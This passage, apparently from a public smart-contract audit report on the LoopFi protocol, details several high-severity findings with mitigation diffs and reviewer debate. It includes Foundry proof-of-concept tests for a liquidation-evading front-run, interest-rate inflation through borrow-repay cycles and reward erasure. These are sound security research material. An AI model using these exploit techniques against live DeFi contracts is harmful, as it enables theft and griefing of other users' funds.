+   _setupRole(VAULT_ADMIN_ROLE, vaultAdminRole);
+   _setupRole(VAULT_CONFIG_ROLE, vaultConfigRole);
    }
```

### Assessed type

Access Control

**[amarcu (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/174#issuecomment-2363353569):**
> Acknowledged but we will remove and not use the `AuraVault`.

***

## [[H-05] There is a calculation error in `AuraVault::redeem()`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/170)
*Submitted by [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/170), also found by [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/32)*

The amount of funds that users can withdraw decreases, leading to a loss of funds for users.

### Proof of Concept

```javascript
  function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) public virtual override(IERC4626, ERC4626) returns (uint256) {
        require(shares <= maxRedeem(owner), "ERC4626: redeem more than max");

        // Redeem assets from Aura reward pool and send to "receiver"
@>>        uint256 assets = IPool(rewardPool).redeem(shares, address(this), address(this));

        _withdraw(_msgSender(), receiver, owner, assets, shares);

        return assets;
    }
```

We can see that `AuraVault::redeem()` confuses AuraVault’s shares with `rewardPool`’s shares. AuraVault’s shares need to be converted into AuraVault’s underlying tokens (assets) before they can be withdrawn. This is particularly problematic because, as we know from the `rewardPool` contract address, `rewardPool::redeem()` functions the same way as `rewardPool::withdraw()`.

<https://vscode.blockscan.com/ethereum/0x00A7BA8Ae7bca0B10A32Ea1f8e2a1Da980c6CAd2>

```javascript
 function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external virtual override returns (uint256) {
        return withdraw(shares, receiver, owner);
    }
```

Moreover, in the `rewardPool`, the ratio of share to asset is always 1:1.

**Scenario Example:**

Let’s assume that in `AuraVault`, the ratio of share to asset is always 1:2. In this case, if a user withdraws 1 share, they will ultimately receive only 1 asset; whereas, they should have received 2 assets.

### Recommended Mitigation Steps

```diff
  function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) public virtual override(IERC4626, ERC4626) returns (uint256) {
        require(shares <= maxRedeem(owner), "ERC4626: redeem more than max");
+        uint256 assets = previewRedeem(shares);

        // Redeem assets from Aura reward pool and send to "receiver"
-       uint256 assets = IPool(rewardPool).redeem(shares, address(this), address(this));
+        assets = IPool(rewardPool).redeem(assets, address(this), address(this));

        _withdraw(_msgSender(), receiver, owner, assets, shares);

        return assets;
    }
```

### Assessed type

Error

**[amarcu (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/170#issuecomment-2363355582):**
> Acknowledged but we will remove and not use the `AuraVault`.

***

## [[H-06] Malicious borrower can evade full liquidation in `CDPVault::liquidatePosition` by repaying small amounts of debt ](https://github.com/code-423n4/2024-07-loopfi-findings/issues/162)
*Submitted by [0xbepresent](https://github.com/code-423n4/2024-07-loopfi-findings/issues/162), also found by [Spearmint](https://github.com/code-423n4/2024-07-loopfi-findings/issues/404) and [Evo](https://github.com/code-423n4/2024-07-loopfi-findings/issues/268)*

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509>

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L713>

### Impact

In the `CDPVault::liquidatePosition` function, a liquidator can repay the total debt of a position to liquidate it, this can be achieved by calling the `CDPVault::virtualDebt` function to obtain the total debt and then call `CDPVault::liquidatePosition`. However, a malicious borrower can front-run this liquidation transaction by repaying a small amount (e.g., 1 wei) of the debt. This action causes the debt to be slightly less than the amount the liquidator intends to repay. Consequently, the subtraction operation in `CDPVault#L713` will underflow, leading to a revert in the transaction. This will allow borrowers to evade total debt liquidation.

### Proof of Concept

Consider the next scenario:

1. Assume the initial debt is `80 ether`. The position is liquidatable.
2. Liquidator prepares to repay the full debt `80 ether` to liquidate the position via `CDPVault::liquidatePosition`. Liquidator gets the full debt using `CDPVault::virtualDebt` function.
3. Malicious borrower front-runs the transaction and repays `1 wei`, the debt is now `80 ether - 1 wei`.
4. Liquidator's transaction is executed but it attempts to repay `80 ether`, causing an underflow when the `newDebt` is calculated `CDPVault#L713` as `(80 ether - 1 wei) - 80 ether`.

```solidity
File: CDPVault.sol
652:     function calcDecrease(
653:         uint256 amount,
654:         uint256 debt,
655:         uint256 cumulativeIndexNow,
656:         uint256 cumulativeIndexLastUpdate,
657:         uint128 cumulativeQuotaInterest
658:     )
659:         internal
660:         pure
661:         returns (uint256 newDebt, uint256 newCumulativeIndex, uint256 profit, uint128 newCumulativeQuotaInterest)
662:     {
663:         uint256 amountToRepay = amount;
...
...
713:>>>      newDebt = debt - amountToRepay;  // underflow
714:     }
```

The next test demonstrates how the malicious borrower can evade full liquidation by repaying small amounts of the debt.

```solidity
    // File: CDPVault.t.sol
    function test_liquidate_fullliquidation_panicerror() public {
        CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 1 ether, 0.95 ether);
        createGaugeAndSetGauge(address(vault));
        // create position
        _modifyCollateralAndDebt(vault, 110 ether, 80 ether);
        // position is liquidatable
        _updateSpot(0.80 ether);
        //
        // 1. Liquidator calculates the full debt in order to call `CDPVault::liquidatePosition`.
        address position = address(this);
        uint256 liquidatorRepayAmount = virtualDebt(vault, position);
        address liquidator = address(0xb0b);
        createCredit(liquidator, liquidatorRepayAmount);
        //
        // 2. Malicious borrower frontrun liquidator and repays 1 wei
        mockWETH.approve(address(vault), 1);
        vault.modifyCollateralAndDebt(address(this), address(this), address(this), 0, -toInt256(1));
        //
        // 3. Liquidator tx is executed but it will be reverted by `arithmeticError`
        vm.startPrank(liquidator);
        mockWETH.approve(address(vault), liquidatorRepayAmount);
        vm.expectRevert(stdError.arithmeticError);
        vault.liquidatePosition(position, liquidatorRepayAmount);
    }
```

### Recommended Mitigation Steps

Implement a validation to prevent repayment if the position remains liquidable after increasing the repayment amount.

### Assessed type

Under/Overflow

**[0xtj24 (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/162#issuecomment-2340444596):**
 > All liquidators would have to take into account a possible repayment from other liquidators. He could split into 2 repayments for example.
 >
> The `liquidatePosition` already checks if an amount is too high for repayment. Also, in case of 1 wei, it is not economically feasible since it would just be better for the borrower to repay instead of spending gas for multiple txs to avoid liquidation, since it would have to constantly frontrunning it.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/162#issuecomment-2372136545):**
 > I see two issues here:
> - A malicious actor can DoS liquidators, not only one. Since liquidators race and eventually one will win. In this case, the malicious actor. 
> - DoS could naturally happen if more than one liquidator race for liquidation and the sum of the amounts isn't equal to the highest possible amount. 
> 
> Please take into consideration, if the loan is too big, the costs of gas is relatively too small.

***

## [[H-07] Malicious borrower cycle exploits to inflate interest rates](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129)
*Submitted by [Evo](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129)*

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L256>

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L272>

### Impact

The current implementation allows a malicious actor to artificially inflate interest rates for all borrowers in the system through rapid borrow-and-repay cycles. This exploit can lead to:

1. Increased costs for legitimate borrowers who may face higher interest rates than expected.
2. Potential forced liquidations of other borrowers if interest rates rise rapidly enough to push their positions into unsafe territory.
3. Unfair advantage for the attacker if they are also a lender in the system, as they could increase returns on their deposits.

This vulnerability undermines the fairness and stability of the lending platform, potentially leading to loss of funds for users.

### Proof of Concept

The following test demonstrates the attack by comparing interest accrual with and without the borrow-repay cycles, please add this test function to `CDPVault.t.sol` test file:

<details>

```solidity
function test_borrow_repay_cycles_with_attack() public {
  compare_interest_accrual_with_borrow_repay_cycles(true);
}
function test_borrow_repay_cycles_without_attack() public {
  compare_interest_accrual_with_borrow_repay_cycles(false);
}


//    A cycle borrower can increase the interest rate on other borrowers. by borrow and repay.
function compare_interest_accrual_with_borrow_repay_cycles(bool attack) internal {
  

  console.log(attack?"Cycle borrower is attacking":"Cycle borrower is NOT attacking");

  
  CDPVault vault = createCDPVault(token, 1000 ether, 0, 1.25 ether, 1.0 ether, 0);
  createGaugeAndSetGauge(address(vault));

  // Setup two borrowers
  address normalBorrower = address(0x1);
  address cycleBorrower = address(0x2);
  address normalBorrower2 = address(0x3);

  // Deposit more collateral to ensure safe ratios
  uint256 collateralAmount = 200 ether;
  token.mint(normalBorrower, collateralAmount);
  vm.prank(normalBorrower);
  token.approve(address(vault), collateralAmount);
  vm.prank(normalBorrower);
  vault.deposit(normalBorrower, collateralAmount);


  token.mint(normalBorrower2, collateralAmount);
  vm.prank(normalBorrower2);
  token.approve(address(vault), collateralAmount);
  vm.prank(normalBorrower2);
  vault.deposit(normalBorrower2, collateralAmount);


  {
  token.mint(cycleBorrower, collateralAmount);
  console.log("Cycle borrower Balance Before:", token.balanceOf(cycleBorrower));
  }
  vm.prank(cycleBorrower);
  token.approve(address(vault), collateralAmount);
  vm.prank(cycleBorrower);
  vault.deposit(cycleBorrower, collateralAmount);



  // Both borrowers take out initial loans
  uint256 borrowAmount = 50 ether;
  vm.prank(normalBorrower);
  vault.modifyCollateralAndDebt(normalBorrower, normalBorrower, normalBorrower, 0, int256(borrowAmount));
  vm.prank(normalBorrower2);
  vault.modifyCollateralAndDebt(normalBorrower2, normalBorrower2, normalBorrower2, 0, int256(borrowAmount));

  // Record initial state
  uint256 initialDebtNormal = vault.virtualDebt(normalBorrower);
  uint256 initialDebtNormal2 = vault.virtualDebt(normalBorrower2);
  uint256 initialDebtCycle = vault.virtualDebt(cycleBorrower);

  console.log("Initial state:");
  logPoolState(vault);

  // Simulate passage of time and borrow-repay cycles
  uint256 cycles = 10;
  uint256 timeBetweenCycles = 1 hours;

  // Mint a large amount of WETH to this contract to cover all potential debts
  mockWETH.mint(address(this), 1000 ether);
{

  for (uint256 i = 0; i < cycles; i++) {
      if(attack){
      vm.startPrank(cycleBorrower);
      
      vault.modifyCollateralAndDebt(cycleBorrower, cycleBorrower, cycleBorrower, 0, int256(borrowAmount));
      
      // Repay all debt
      uint256 currentDebt = vault.virtualDebt(cycleBorrower);
      
      if (currentDebt > 0) {
          mockWETH.transfer(cycleBorrower, currentDebt);
          mockWETH.approve(address(vault), currentDebt);
          vault.modifyCollateralAndDebt(cycleBorrower, cycleBorrower, cycleBorrower, 0, -int256(currentDebt));
      }
      
      console.log("Borrow and repay Cycle: #", i+1);
      
      vm.stopPrank();

      }
      // Advance time
      vm.warp(block.timestamp + timeBetweenCycles);
  }
}
  vm.startPrank(cycleBorrower);
  vault.withdraw(cycleBorrower, collateralAmount);
  vm.stopPrank();


  // Check final debts
  uint256 finalDebtNormal = vault.virtualDebt(normalBorrower);
  uint256 finalDebtNormal2 = vault.virtualDebt(normalBorrower2);

  // Calculate accrued interest
  console.log("Debts ======");

  console.log("initialDebtNormal:", initialDebtNormal);
  console.log("finalDebtNormal:", finalDebtNormal);
  console.log("initialDebtNormal2:", initialDebtNormal2);
  console.log("finalDebtNormal2:", finalDebtNormal2);
  

  uint256 accruedInterestNormal = finalDebtNormal - initialDebtNormal;
  uint256 accruedInterestNormal2 = finalDebtNormal2 - initialDebtNormal2;


  // Calculate accrued interest
  console.log("\n Accrued interest ======");
  console.log("Normal borrower initial debt:", initialDebtNormal);
  console.log("Normal borrower final debt:", finalDebtNormal);
  console.log("Normal borrower accrued interest:", accruedInterestNormal);

  console.log("Normal borrower 2 initial debt:", initialDebtNormal2);
  console.log("Normal borrower 2 final debt:", finalDebtNormal2);
  console.log("Normal borrower 2 accrued interest:", accruedInterestNormal2);
  console.log("======");

  logPoolState(vault);

  
  logBalance(cycleBorrower);
  
}

function logBalance(address addr) internal view {
  console.log("Cycle borrower Balance After:", token.balanceOf(addr));
}


function logPoolState(CDPVault vault) internal view {
  address poolAddress = address(vault.pool());
  console.log("  Total Debt:", vault.totalDebt());
  console.log("  Expected Liquidity:", IPoolV3(poolAddress).expectedLiquidity());
  console.log("  Available Liquidity:", IPoolV3(poolAddress).availableLiquidity());
  console.log("  Utilization:", calculateUtilization(
      IPoolV3(poolAddress).expectedLiquidity(),
      IPoolV3(poolAddress).availableLiquidity()
  ));
  console.log("  Base Interest Rate:", IPoolV3(poolAddress).baseInterestRate());
}

function calculateUtilization(uint256 expectedLiquidity, uint256 availableLiquidity) internal pure returns (uint256) {
  if (expectedLiquidity == 0) return 0;
  return ((expectedLiquidity - availableLiquidity) * 10000) / expectedLiquidity;
}
```

</details>

**Results from the test output:**

1. With attack:
    - Normal borrower accrued interest: `5766476609207981`
    - Base Interest Rate after cycles: `100023531853668664470588235`

2. Without attack:
    - Normal borrower accrued interest: `5766183185603008`
    - Base Interest Rate after cycles: `100023529411764705882352941`

The attack results in higher accrued interest for normal borrowers and an increased base interest rate, despite the total debt remaining the same.

**The output:**

```
[PASS] test_borrow_repay_cycles_with_attack() (gas: 5103632)
Logs:
  Cycle borrower is attacking
  Cycle borrower Balance Before: 200000000000000000000
  Initial state:
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000000000000000000000
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023529411764705882352941
  Borrow and repay Cycle: # 1
  Borrow and repay Cycle: # 2
  Borrow and repay Cycle: # 3
  Borrow and repay Cycle: # 4
  Borrow and repay Cycle: # 5
  Borrow and repay Cycle: # 6
  Borrow and repay Cycle: # 7
  Borrow and repay Cycle: # 8
  Borrow and repay Cycle: # 9
  Borrow and repay Cycle: # 10
  Debts ======
  initialDebtNormal: 50000000000000000000
  finalDebtNormal: 50005766476609207981
  initialDebtNormal2: 50000000000000000000
  finalDebtNormal2: 50005766476609207981
  
 Accrued interest ======
  Normal borrower initial debt: 50000000000000000000
  Normal borrower final debt: 50005766476609207981
  Normal borrower accrued interest: 5766476609207981
  Normal borrower 2 initial debt: 50000000000000000000
  Normal borrower 2 final debt: 50005766476609207981
  Normal borrower 2 accrued interest: 5766476609207981
  ======
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000011532366510584090
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023531853668664470588235
  Cycle borrower Balance After: 200000000000000000000

[PASS] test_borrow_repay_cycles_without_attack() (gas: 4077140)
Logs:
  Cycle borrower is NOT attacking
  Cycle borrower Balance Before: 200000000000000000000
  Initial state:
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000000000000000000000
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023529411764705882352941
  Debts ======
  initialDebtNormal: 50000000000000000000
  finalDebtNormal: 50005766183185603008
  initialDebtNormal2: 50000000000000000000
  finalDebtNormal2: 50005766183185603008
  
 Accrued interest ======
  Normal borrower initial debt: 50000000000000000000
  Normal borrower final debt: 50005766183185603008
  Normal borrower accrued interest: 5766183185603008
  Normal borrower 2 initial debt: 50000000000000000000
  Normal borrower 2 final debt: 50005766183185603008
  Normal borrower 2 accrued interest: 5766183185603008
  ======
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000011532366371206016
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023529411764705882352941
  Cycle borrower Balance After: 200000000000000000000
```

To run the test:

```sh
forge test --match-test "test_borrow_repay_cycles" -vv
```

### Recommended Mitigation Steps

- Consider adding a fee for taking a loan (including same block loan) to disincentivize this behavior.
- Add a minimum duration for loans, requiring borrowers to hold the loan for a set period before repaying.

**[0xtj24 (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2340474917):**
 > This is an expected behaviour since the base rate will depend on the utilization rate so if a user borrows rates will increase.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2371810141):**
 > @0xtj24 - Per my understanding, the main issue is a risk free attack to inflate the rates since the attacker doesn't pay any fee.

**[0xAlix2 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2391871028):**
 > @Koolex - I believe this is intended, if the user is borrowing debt, then repaying the debt; i.e., the protocol is making some profit, the interest rate should indeed increase. As the sponsor mentioned, it depends on the utilization rate. This can't even be considered griefing as the attacker will lose money, as he'll be continuously paying his debt + some interest. 
> 
> Hence, I believe this is invalid.

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2392890903):**
 > Agree with @0xAlix2. The "attacker" needs to pay off debt himself, so this is not risk-free. Technically this isn't an attack, more like continuously borrowing/repaying assets and paying the debt, which is do-able on any lending protocol.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2439998363):**
 > The attacker has their balance (before and after) the same `200000000000000000000`. Stays as-is.

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2440116812):**
 > @Koolex - Apologies for replying out of PJQA phase, but I want to point out something that is not mentioned before. I misunderstood this issue in the beginning, and after going through the coded PoC in depth, I believe this is definitely by design and not an issue.
> 
> In the coded PoC, it is true `test_borrow_repay_cycles_with_attack` will inflate the rate higher than `test_borrow_repay_cycles_without_attack`, and the "attacker" does not lose anything but gas fee. However, this is due to the fact that borrow rate is compounded, and each time "attacker" triggers a transaction to the CDPVault, the borrow rate is updated.
> 
> For example, if the borrow rate is 10% per year.
> - If rate update is only triggered once 1 year later, the final borrow rate will be `110%`.
> - However, if it triggered twice (once per half year), the borrow rate will be `105% * 105% = 110.25%`.
> 
> Similarly, if the rate update is triggered more frequently, the borrow rate would be higher. The key is, there is an upper limit to this (See [continuous compounding](https://en.wikipedia.org/wiki/Compound_interest)).
> 
> It is actually quite normal for these lending protocols to implement a simple compound mechanism to be triggered per transaction, since it is a much easier design than continuous compounding; E.g., CompoundV2 uses the similar mechanism.
> 
> Thus I strongly believe this is by design and not a high severity issue. I'd appreciate if you can reconsider this issue. Thanks!
> 
> https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/PoolV3.sol#L642-L678
>
> ```solidity
>     function _updateBaseInterest(
>         int256 expectedLiquidityDelta,
>         int256 availableLiquidityDelta,
>         bool checkOptimalBorrowing
>     ) internal {
>         uint256 expectedLiquidity_ = (expectedLiquidity().toInt256() + expectedLiquidityDelta).toUint256();
>         uint256 availableLiquidity_ = (availableLiquidity().toInt256() + availableLiquidityDelta).toUint256();
> 
>         uint256 lastBaseInterestUpdate_ = lastBaseInterestUpdate;
>         if (block.timestamp != lastBaseInterestUpdate_) {
> @>          _baseInterestIndexLU = _calcBaseInterestIndex(lastBaseInterestUpdate_).toUint128(); // U:[LP-18]
>             lastBaseInterestUpdate = uint40(block.timestamp);
>         }
> 
>         if (block.timestamp != lastQuotaRevenueUpdate) {
>             lastQuotaRevenueUpdate = uint40(block.timestamp); // U:[LP-18]
>         }
> 
>         _expectedLiquidityLU = expectedLiquidity_.toUint128(); // U:[LP-18]
>         _baseInterestRate = ILinearInterestRateModelV3(interestRateModel)
>             .calcBorrowRate({
>                 expectedLiquidity: expectedLiquidity_,
>                 availableLiquidity: availableLiquidity_,
>                 checkOptimalBorrowing: checkOptimalBorrowing
>             })
>             .toUint128(); // U:[LP-18]
>     }
> 
>     /// @dev Computes base interest accrued since given timestamp
>     function _calcBaseInterestAccrued(uint256 timestamp) private view returns (uint256) {
>         return (_totalDebt.borrowed * baseInterestRate().calcLinearGrowth(timestamp)) / RAY;
>     }
> 
>     /// @dev Computes current value of base interest index
>     function _calcBaseInterestIndex(uint256 timestamp) private view returns (uint256) {
>         return (_baseInterestIndexLU * (RAY + baseInterestRate().calcLinearGrowth(timestamp))) / RAY;
>     }
> ```

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2440213985):**
 > Still, the attacker is manipulating the interest rate without risk. 

**[xuwinnie (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2440580169):**
 > It seems the attacker does not "manipulate" or "inflate" the rate. Instead he is actually increasing the precision of interest calculation. For example, suppose the target rate is `e`, then for `(1+1/t)^t`, the larger `t` is, the more precise it will be.

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2441765934):**
 > @Koolex - What @xuwinnie said is correct, the *attacker* is actually just making the interest rate more accurate to a continuous compounding, and not *maliciously* inflating the interest, since the upper bound is always continuous compounding.
> 
> I would argue at least this is not a *high sev* since there are no stealing funds or making borrowers lose pay more interest than they should. The so-called *attackers* are just making borrowers pay what they are supposed to pay.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129#issuecomment-2442039226):**
> @pkqs90 - Compare debts in both cases, they are different even though there was no profit for the protocol. Doing this continuously will increase the rate. This can be utilized in many ways by different actors (including adversaries):
> 
> ` Normal borrower final debt: 50005766476609207981` vs `Normal borrower final debt: 50005766183185603008`
> 
> For transparency,  no further comments will be added from my side.

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129).*

***

## [[H-08] `vestTokens` bug in `MultiFeeDistribution.sol` causes new incentives to erase previous incentives](https://github.com/code-423n4/2024-07-loopfi-findings/issues/126)
*Submitted by [rscodes](https://github.com/code-423n4/2024-07-loopfi-findings/issues/126), also found by [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/328) and [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/23)*

In `MultiFeeDistribution.sol`, the function `_notifyReward(address rewardToken, uint256 reward)` does not change `r.rewardPerTokenStored` and hence, relies on `_updateReward(address account)` to be called before any calls to `_notifyReward`. The rest of the functions who call `_notifyReward` follows this rule; except for `vestTokens` when it is called by a minter to give incentives to the lockers.

```solidity
function vestTokens(address user, uint256 amount, bool withPenalty) external whenNotPaused {
    if (!minters[msg.sender]) revert InsufficientPermission();
    if (amount == 0) return;

    if (user == address(this)) {
->       // minting to this contract adds the new tokens as incentives for lockers
->       _notifyReward(address(rdntToken), amount);
->       return;
    }
    ......
}
```

Since `_updateReward` is an internal function, we also **cannot** expect minters to call it on their side before calling `vestTokens`.

Hence, this bug results in `rewardData[rewardToken].rewardPerTokenStored` being inaccurate as it will not contain the previous results accumulated by the previous `rewardData[rewardToken].rewardPerSecond` when minters call `vestTokens`. This results in all lockers losing the rewards previously accumulated by the previous `rewardPerSecond`.

### Proof of Concept

```solidity
01: function test_rewardsGone() public {
02:     assert(rewardsDuration == 30 days); // we will use 30 days as the rewardsDuration for convenience 
03:     address Alice = address(0x123456);
04:     uint256 amount = 1 ether;
05:     uint256[] memory lockDurations = new uint256[](1);
06:     uint256[] memory rewardMultipliers = new uint256[](1);
07:     lockDurations[0] = 700 days;
08:     rewardMultipliers[0] = 1;
09:     multiFeeDistribution.setLockTypeInfo(lockDurations, rewardMultipliers);
10: 
11:     stakeToken.mint(address(this), amount);
12:     multiFeeDistribution.setLPToken(address(stakeToken));
13: 
14:     multiFeeDistribution.setAddresses(IChefIncentivesController(vm.addr(uint256(keccak256("incentivesController")))), vm.addr(uint256(keccak256("treasury"))));
15:     vm.mockCall(
16:         vm.addr(uint256(keccak256("incentivesController"))),
17:         abi.encodeWithSelector(IChefIncentivesController.afterLockUpdate.selector, Alice),
18:         abi.encode(true)
19:     );
20:     stakeToken.approve(address(multiFeeDistribution), amount);
21:     multiFeeDistribution.stake(amount, Alice, 0);    // Alice now has 1 ether staked (with lockTypeIndex=0)
22:     require(multiFeeDistribution.lockedBalance(Alice) == amount);
23: 
24:     address[] memory minters = new address[](1);
25:     minters[0] = address(this);
26:     multiFeeDistribution.setMinters(minters);
27: 
28:     amount = 10000 ether;
29:     loopToken.mint(address(this), amount);
30:     loopToken.transfer(address(multiFeeDistribution), amount);
31: 
32:     vm.mockCall(
33:         mockPriceProvider,
34:         abi.encodeWithSelector(IPriceProvider.getRewardTokenPrice.selector, address(loopToken), amount),
35:         abi.encode(8)
36:     );
37:     multiFeeDistribution.vestTokens(address(multiFeeDistribution), amount, false); //Minter gives first incentives for lockers
38:     
39:     skip(31 days);
40:     IFeeDistribution.RewardData[] memory rewardsData = multiFeeDistribution.claimableRewards(Alice);
41:     require(rewardsData[0].token == address(loopToken));
42:     console.log("After the first incentive given   |", rewardsData[0].amount);
43: 
44: 
45:     amount = 1 ether;
46:     loopToken.mint(address(this), amount);
47:     loopToken.transfer(address(multiFeeDistribution), amount);
48:     vm.mockCall(
49:         mockPriceProvider,
50:         abi.encodeWithSelector(IPriceProvider.getRewardTokenPrice.selector, address(loopToken), amount),
51:         abi.encode(8)
52:     );
53:     multiFeeDistribution.vestTokens(address(multiFeeDistribution), amount, false); //Minter gives second incentives for lockers
54:     rewardsData = multiFeeDistribution.claimableRewards(Alice);
55:     require(rewardsData[0].token == address(loopToken));
56:     console.log("Right after second incentive given|", rewardsData[0].amount);
57: 
58:     skip(31 days);
59:     rewardsData = multiFeeDistribution.claimableRewards(Alice);
60:     require(rewardsData[0].token == address(loopToken));
61:     console.log("After everything ends             |", rewardsData[0].amount);
62: }
```

**Console Output:**

```
Ran 1 test for src/test/unit/MultiFeeDistribution.t.sol:MultiFeeDistributionTest
[PASS] test_rewardsGone() (gas: 738287)
Logs:
  After the first incentive given   | 9999999999999999999999
  Right after second incentive given| 0
  After everything ends             | 999999999999999999

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.35ms (1.38ms CPU time)

Ran 1 test suite in 276.54ms (6.35ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Code walkthrough:

1. (Line 21) Alice stakes 1 ether to become a locker.
2. (Line 37) Trusted minter gives out `10000 ether` as incentive to lockers by calling `vestTokens` with parameter `user == address(MultiFeeDistribution)`.
3. (Line 42) 31 days passed, calling `claimableRewards` now show that Alice has `9999999999999999999999 tokens`(`10 000 ether`) to claim. (Refer to console output).
4. (Line 53) To further reward lockers, the trusted minter further sends a 2nd incentive of `1 ether` (some time after the first incentive was given out), by again calling `vestTokens` with parameter `user == address(MultiFeeDistribution)`.
5. (Line 56) Now, calling `claimableRewards` will show that Alice has `0 tokens` to claim, proving that the previous rewards accumulated from the 1st incentive for the user has been erased.
6. (Line 61) After `rewardsDuration` for the 2nd incentive ends, we call `claimableRewards` again. We can see from the last line of the console output that only `999999999999999999 tokens`(`1 ether`) are left. Proving that Alice's tokens from the first incentive(`10 000 ether`) has been erased, and she only retains her share of the rewards coming from the 2nd incentive(`1 ether`).

### Recommended Mitigation Steps

```diff
function vestTokens(address user, uint256 amount, bool withPenalty) external whenNotPaused {
    if (!minters[msg.sender]) revert InsufficientPermission();
    if (amount == 0) return;

    if (user == address(this)) {
        // minting to this contract adds the new tokens as incentives for lockers
+        _updateReward(address(this));
        _notifyReward(address(rdntToken), amount);
        return;
    }
    ......
}
```

Adding `_updateReward(address(this))` will ensure `rewardData[address(rdntToken)].rewardPerTokenStored` is updated accordingly, so that lockers will not lose previously given incentives.

### Tools Used

Foundry, VSCode

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/126#event-14337803696)**

**[0xAlix2 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/126#issuecomment-2391892947):**
 > @Koolex - The report shows a valid scenario where rewards are messed up; however, it is being confirmed by calling `multiFeeDistribution.claimableRewards` which is just a view function. However, when a user claims his rewards, after the mentioned scenario, he'll be calling `getReward` which updates the rewards (`_updateReward(msg.sender);`), so the impact here is just in a `view` function. Hence, I believe this is a low finding.

**[radin100 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/126#issuecomment-2394950134):**
 > I believe there is a mistake in the comment above. The issue is not just in a view function. The root cause is the following storage update [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/MultiFeeDistribution.sol#L1207).
 >
> This is done without actually updating the `rewardPerTokenStored` from the `_updateReward`. As a result the reward for the period between now and the previous update will be erased. For example, check out the `vestTokens` function:
>
> ```solidity
>  function vestTokens(address user, uint256 amount, bool withPenalty) external whenNotPaused {
>         if (!minters[msg.sender]) revert InsufficientPermission();
>         if (amount == 0) return;
> 
>         if (user == address(this)) {
>             // minting to this contract adds the new tokens as incentives for lockers
>             _notifyReward(address(rdntToken), amount);
>             return;
>         }
> ```
>
> Here `_notifyReward` is called.
> 
> ```solidity
> function _notifyReward(address rewardToken, uint256 reward) internal {
>         address operationExpenseReceiver_ = operationExpenseReceiver;
>         uint256 operationExpenseRatio_ = operationExpenseRatio;
>         if (operationExpenseReceiver_ != address(0) && operationExpenseRatio_ != 0) {
>             uint256 opExAmount = (reward * operationExpenseRatio_) / RATIO_DIVISOR;
>             if (opExAmount != 0) {
>                 IERC20(rewardToken).safeTransfer(operationExpenseReceiver_, opExAmount);
>                 reward = reward - opExAmount;
>             }
>         }
> 
>         Reward storage r = rewardData[rewardToken];
>         if (block.timestamp >= r.periodFinish) {
>             r.rewardPerSecond = (reward * 1e12) / rewardsDuration;
>         } else {
>             uint256 remaining = r.periodFinish - block.timestamp;
>             uint256 leftover = (remaining * r.rewardPerSecond) / 1e12;
>             r.rewardPerSecond = ((reward + leftover) * 1e12) / rewardsDuration;
>         }
> 
>     >>>    r.lastUpdateTime = block.timestamp;
> ```
>
> As you can see the `lastUpdateTime` is set without actually updating the `rewardPerTokenStored`. So next time the reward is updated, the `rewardPerToken` will not account for the missed period:
>
> ```solidity
> function rewardPerToken(address rewardToken) public view returns (uint256 rptStored) {
>         rptStored = rewardData[rewardToken].rewardPerTokenStored;
>         if (lockedSupplyWithMultiplier > 0) {
